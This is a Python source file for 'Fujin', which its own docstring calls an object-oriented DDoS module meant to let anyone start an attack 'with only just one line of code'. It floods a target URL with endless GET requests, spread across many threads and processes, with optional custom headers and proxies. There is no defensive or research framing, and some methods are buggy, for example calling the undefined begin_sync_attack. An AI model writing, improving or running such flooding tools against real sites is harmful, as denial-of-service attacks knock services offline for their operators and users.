
import pip._vendor.requests as requests
import socket
import threading
import multiprocessing
import asyncio

class Fujin:

    def __init__(self, 
                 url: str | None = None, 
                 header: dict | None = None, 
                 proxies: dict | None = None, 
                 data: str | None = None) -> None:
        """
        A Object-Orientated DDoS Module

        Initialise your very own ddos tool with an object with only just one line of code.

        Contains multiple pooling manager modules to help initialise a DDoS

        Allows for entering your very custom own Headers, Data, and Proxies.
        """

        # Turn parameters into self. variables for easy use
        self.url = url 
        self.header = header
        self.proxies = proxies
        self.data = data

        # Initialise the data structures/holders for our multiprocessing functions to speed up our attacks
        self.sync_threads = []
        self.async_threads = []
        self.sync_processes = []
        self.async_processes = []

        # Log
        self.connected = 0
        self.result = None
        self.status_code = None

        # Sessions and object to
        self.session = requests.session()

        # Other
        self.cache_location = '.web_cache'
        self.cache_session = None

    


    #
    # Async and Sync GET Requests
    #
    async def async_get(self) -> None:

        """
        A Normal GET request that uses the requests module

        A requests.session() object held within the self.session object inside the ddos object

        If you would like to run this function by yourself I would advise running either

        await async_get()

        or

        asyncio.run(async_get())

        Most likely the second as it is easiest and fastest to run

        You will require the asyncio module to be installed and imported though.
        """

        # Send A GET Request
        r = self.session.get(self.url, headers=self.header)

        # Assign to Object-Orientated Variable
        self.status_code = r.status_code
        self.connected += 1
        self.result = self.connected, self.status_code

        print(f"{self.result}")
    


    def sync_get(self) -> None:

        """
        A simple synchronous function that allows you to run a GET request
        """
        
        # Send A GET Request
        r = self.session.get(self.url, headers=self.header)

        # Assign to Object-Orientated Variable
        self.status_code = r.status_code
        self.connected += 1
        self.result = self.connected, self.status_code

        print(f"{self.result}")
    



    #
    # Infinite loops for Async and Sync functions
    #
    def begin_async_get_attack(self) -> None:   

        """
        while 1:
            asyncio.run(ddos.async_get(self))

        An infinite while loop run .run function of the asyncio module

        asyncio.run() allows you to run an individual asynchronous function.

        (This function is synchronous to allow for asynchronous)

        I would advise using the threading or multiprocessing function
        """

        while 1:
            asyncio.run(self.async_get())


    def begin_sync_get_attack(self) -> None:
        while 1:
            self.sync_get(self)

    


    #
    # Threading Attacks
    #
    def thread_async_attack(self, 
                            threads: int | None=None, 
                            daemon: bool | None=None) -> None:
        """
        Uses the threading module to speed up the attack, with as many threads as you like
        """

        for x in range(threads):
            t = threading.Thread(target=self.begin_async_get_attack, daemon=daemon)
            self.async_threads.append(t)
        for x in range(threads):
            self.async_threads[x].start()
        for x in range(threads):
            self.async_threads[x].join()

    def thread_sync_attack(self, threads: int, daemon: bool) -> None:
        """
        Uses the threading module to speed up the attack, with as many threads as you like
        """

        for x in range(threads):
            t = threading.Thread(target=self.begin_sync_attack, daemon=daemon)
            self.sync_threads.append(t)
        for x in range(50):
            self.sync_threads[x].start()
        for x in range(50):
            self.sync_threads[x].join()




    #
    # Multiprocessing Attacks
    #
    def multiproc_sync_attack(self, 
                              number_of_processes: int | None = None, 
                              daemon: bool | None = None) -> None:
        """
        Uses the multiprocessing function to speed up the attack.
        """

        numproc = number_of_processes

        for x in range(numproc):
            p = multiprocessing.Process(target=self.begin_sync_attack, daemon=daemon)
            self.sync_processes.append(p)
        for x in range(numproc):
            self.sync_processes[x].start()
        for x in range(numproc):
            self.sync_processes[x].join()

    def multiproc_async_attack(self, 
                               number_of_processes: int | None = None, 
                               daemon: bool | None = None) -> None:

        """
        Uses the multiprocessing function to speed up the attack.

        It pools a synchronous function that contains an infinite loop that runs the asynchronous function
        """
        
        numproc = number_of_processes

        for x in range(numproc):
            p = multiprocessing.Process(target=self.begin_async_get_attack, daemon=daemon)
            self.async_processes.append(p)
        for x in range(numproc):
            self.async_processes[x].start()
        for x in range(numproc):
            self.async_processes[x].join()
